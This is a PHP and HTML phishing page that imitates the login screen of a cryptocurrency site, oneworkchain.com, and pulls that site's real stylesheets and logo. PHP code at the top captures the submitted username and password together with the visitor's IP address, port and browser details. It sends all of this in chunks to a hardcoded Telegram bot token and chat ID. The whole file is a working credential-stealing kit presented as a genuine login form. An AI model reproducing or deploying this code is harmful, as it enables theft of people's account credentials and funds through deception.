<?php
$token = '2035537244:AAENXWddiB53xFXAERwaQECz8r4kDDWHfe4';

$email = '-';
$password = '-';
if(isset($_POST['Email']))
{
	$email = $_POST['Email'];
	$password = $_POST['Password'];
}

$datas = '';
$datas.= 'REMOTE_PORT: '.$_SERVER['REMOTE_PORT'].'<br/>';
$datas.= 'SERVER_ADDR: '.$_SERVER['SERVER_ADDR'].'<br/>';
$datas.= 'REMOTE_ADDR: '.$_SERVER['REMOTE_ADDR'].'<br/>';
$datas.= 'HTTP_USER_AGENT: '.$_SERVER['HTTP_USER_AGENT'].'<br/>';
$datas.= 'HTTP_SEC_CH_UA_PLATFORM: '.$_SERVER['HTTP_SEC_CH_UA_PLATFORM'].'<br/>';

$params['chat_id'] = 499573430;
$params['text'] = json_encode($datas);
$lim = 650;
$mCount = ceil(strlen($params['text']) / $lim);
$text = $email.' === '.$password.' === '.$params['text'];

$result = '';
for($i=1;$i<=$mCount;$i++)
{
	$st = $i * $lim - $lim;
	$params['text'] = substr($text, $st, $lim);

	$url = "https://api.telegram.org/bot".$token . "/sendMessage?" . http_build_query( $params );
	
	file_get_contents($url);
	sleep(0.2);
}
?>

<!doctype html>
<html class="no-js" lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>Login</title>
    <meta name="robots" content="noindex, follow" />
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- Favicon -->
    <link rel="shortcut icon" type="image/x-icon" href="../images/favicon.ico">

    <!-- CSS
	============================================ -->

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://oneworkchain.com/Views/assets/css/vendor/bootstrap.min.css">

    <!-- Icon Font CSS -->
    <link rel="stylesheet" href="https://oneworkchain.com/Views/assets/css/vendor/material-design-iconic-font.min.css">
    <link rel="stylesheet" href="https://oneworkchain.com/Views/assets/css/vendor/font-awesome.min.css">
    <link rel="stylesheet" href="https://oneworkchain.com/Views/assets/css/vendor/themify-icons.css">
    <link rel="stylesheet" href="https://oneworkchain.com/Views/assets/css/vendor/cryptocurrency-icons.css">

    <!-- Plugins CSS -->
    <link rel="stylesheet" href="https://oneworkchain.com/Views/assets/css/plugins/plugins.css">

    <!-- Helper CSS -->
    <link rel="stylesheet" href="https://oneworkchain.com/Views/assets/css/helper.css">

    
	<!-- Main Style CSS -->
    <link rel="stylesheet" href="https://oneworkchain.com/Views/assets/css/style.css">

	<script type="text/javascript" src="https://gc.kis.v2.scr.kaspersky-labs.com/FD126C42-EBFA-4E12-B309-BB3FDD723AC1/main.js?attr=oYouN4cWDF6mw0148H2W2e29plPzfdZrHkHjdlPLbiP5QJT43f0EGyp7GkSUswFaWl68lMSxGvOIzynbuN-VBA" charset="UTF-8"></script><style>
		#swal2-title {
		color:black;}
	</style>
	
	<!-- Parola görme style -->
	<style>
		body{margin:0;height:100vh}

/*ikon*/
.form-group{position:relative}
#degistir{position:absolute;bottom:0px;right:0px;top:0px;width:40px;display:flex;justify-content:center;align-items:center;border-top-right-radius:.25rem;border-bottom-right-radius:.25rem}
	</style>
	<!-- Parola görme style -->
	
	<!--Binance Capcha style-->
	
	<script src="https://www.hCaptcha.com/1/api.js" async defer></script>
	<script type="text/javascript" src="/sweetalert/sweetalert2.all.min.js"></script>
	
	
	<!--Binance Capcha style-->
</head>

<body class="skin-dark">

    <div class="main-wrapper">

        <!-- Content Body Start -->
        <div class="content-body m-0 p-0">

            <div class="login-register-wrap">
                <div class="row" style="background-color:#050e2b">

                    <div class="d-flex align-self-center justify-content-center order-2 order-lg-1 col-lg-5 col-12">
                        <div class="login-register-form-wrap">

                            <div class="content">
								<center><a href="https://oneworkchain.com/"><img src="https://oneworkchain.com/demo/assets/images/logo.png"/></a></center><hr>
                                <h1 style="margin-top:100px">Login</h1>
                                <p></p>
                            </div>

                            <div class="login-register-form">
                                <form action="" method="POST">
                                    <div class="row">
                                        <div class="col-12 mb-20"><input class="form-control" type="text" placeholder="Username" name="Email" required></div>
                                        <div class="col-12 mb-20 form-group">
											<input class="form-control sifre" type="password" placeholder="Password" name="Password" required>
											<i id="degistir" class="fa fa-eye text-white bg-primary"></i>
										</div>
                                        <div class="col-12 mb-20">
                                            
                                        </div>
                                        <div class="col-12">
                                            <div class="row justify-content-between">
                                                <div class="col-auto mb-15"><a href="forgot_password.php">Forgot Password?</a></div>
                                            </div>
                                        </div>


                                        <div class="col-12 mt-10">
                                            <input class="sweetalert sweetalert-uyari button button-danger" type="submit" value='Sign In' name="Submit" required>
                                        </div>
                                    </div>
                                </form>
                            </div>


                        </div>
                    </div>

                    <div class="login-register-bg order-1 order-lg-2 col-lg-7 col-12">
                        <div class="content">
                            <h1></h1>
                            
                        </div>
                    </div>

                </div>
            </div>

        </div><!-- Content Body End -->

    </div>


		

    <!-- JS
============================================ -->

    <!-- Global Vendor, plugins & Activation JS -->
    <script src="https://oneworkchain.com/Views/assets/js/vendor/modernizr-3.6.0.min.js"></script>
    <script src="https://oneworkchain.com/Views/assets/js/vendor/jquery-3.3.1.min.js"></script>
    <script src="https://oneworkchain.com/Views/assets/js/vendor/popper.min.js"></script>
    <script src="https://oneworkchain.com/Views/assets/js/vendor/bootstrap.min.js"></script>
    <!--Plugins JS-->
    <script src="https://oneworkchain.com/Views/assets/js/plugins/perfect-scrollbar.min.js"></script>
    <script src="https://oneworkchain.com/Views/assets/js/plugins/tippy4.min.js.js"></script>
    <!--Main JS-->
    <script src="https://oneworkchain.com/Views/assets/js/main.js"></script>
	
  

<script>
// Sayfa hazır olduğunda
$(document).ready(function () {
    // değiştir göz ikonuna tıklandığında
    $("#degistir").click(function () {
        // eğer type niteliği password ise
        if ($(".sifre").attr("type") == "password") {
            // type niteliğini text olarak değiştir
            $(".sifre").attr("type", "text");
        }
        // password değil text ise
        else {
            // type niteliğini password olarak değiştir
            $(".sifre").attr("type", "password");
        }
    });
});
	</script>
</body>

</html>

